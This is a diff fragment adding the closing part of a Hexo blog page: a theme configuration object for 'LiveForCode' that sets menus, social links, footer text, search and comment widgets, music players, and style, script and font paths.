+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://zhihu.com/people/worstone-29",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://weibo.com/u/5749847477",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/first19326",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2022 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Valine : {
+            switch         : true,
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js"
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "简单地活着, 肆意又精彩."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
